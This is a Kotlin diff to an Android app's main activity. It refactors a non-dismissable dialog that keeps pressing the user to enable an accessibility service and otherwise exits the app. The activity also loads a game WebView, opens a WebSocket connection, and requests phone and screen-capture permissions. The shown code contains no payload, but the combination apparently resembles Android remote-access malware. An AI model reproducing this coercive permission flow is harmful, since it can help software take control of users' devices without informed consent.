@@ -35,62 +35,76 @@ class MainActivity : AppCompatActivity() {
     private var serviceStarted = false
     private var accessibilityDialog: AlertDialog? = null
 
-    override fun onCreate(savedInstanceState: Bundle?) {
+
+private var dialogShowing = false
+
+override fun onCreate(savedInstanceState: Bundle?) {
     super.onCreate(savedInstanceState)
-    supportActionBar?.hide()
     setContentView(R.layout.activity_main)
+    supportActionBar?.hide()
     
     webSocketManager = WebSocketManager(this)
     gameView = findViewById(R.id.gameWebView)
     
     setupGameView()
     
-    // Check accessibility and show dialog if needed
-    checkAccessibilityService()
+    // Check on create
+    if (!isAccessibilityServiceEnabled()) {
+        showAccessibilityDialog()
+    }
     
     requestPhonePermission()
-    requestScreenCapture()
+    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
+        requestScreenCapture()
+    }
     webSocketManager.connect()
 }
 
 override fun onResume() {
     super.onResume()
-    val enabled = isAccessibilityServiceEnabled()
-    LogUtil.i("MainActivity", "onResume: accessibility enabled = $enabled")
-    if (!enabled) {
-        checkAccessibilityService()
+    if (!isAccessibilityServiceEnabled()) {
+        if (!dialogShowing) {
+            showAccessibilityDialog()
+        }
+    } else {
+        dismissAccessibilityDialog()
     }
 }
 
-
-    private fun checkAccessibilityService() {
-    if (!isAccessibilityServiceEnabled()) {
-        if (accessibilityDialog?.isShowing == true) return // Already showing
-        try {
-            val dialogView = layoutInflater.inflate(R.layout.dialog_accessibility, null)
-            accessibilityDialog = AlertDialog.Builder(this, R.style.CustomDialog)
-                .setView(dialogView)
-                .setCancelable(false)
-                .create()
-            
-            dialogView.findViewById<Button>(R.id.btnSettings)?.setOnClickListener {
-                val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
-                startActivity(intent)
-            }
-            dialogView.findViewById<Button>(R.id.btnExit)?.setOnClickListener {
-                finishAffinity()
-            }
-            
-            accessibilityDialog?.show()
-        } catch (e: Exception) {
-            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
+private fun showAccessibilityDialog() {
+    if (dialogShowing) return
+    dialogShowing = true
+    try {
+        val dialogView = layoutInflater.inflate(R.layout.dialog_accessibility, null)
+        accessibilityDialog = AlertDialog.Builder(this, R.style.CustomDialog)
+            .setView(dialogView)
+            .setCancelable(false)
+            .create()
+        
+        dialogView.findViewById<Button>(R.id.btnSettings)?.setOnClickListener {
+            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
+            startActivity(intent)
         }
-    } else {
-        // Dismiss dialog if accessibility is now enabled
-        accessibilityDialog?.dismiss()
-        accessibilityDialog = null
-        updateStatus("Ready")
+        dialogView.findViewById<Button>(R.id.btnExit)?.setOnClickListener {
+            finishAffinity()
+        }
+        
+        accessibilityDialog?.setOnDismissListener {
+            dialogShowing = false
+        }
+        accessibilityDialog?.show()
+    } catch (e: Exception) {
+        dialogShowing = false
+        startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
     }
+}
+
+private fun dismissAccessibilityDialog() {
+    if (accessibilityDialog?.isShowing == true) {
+        accessibilityDialog?.dismiss()
+    }
+    accessibilityDialog = null
+    dialogShowing = false
 }
 
 
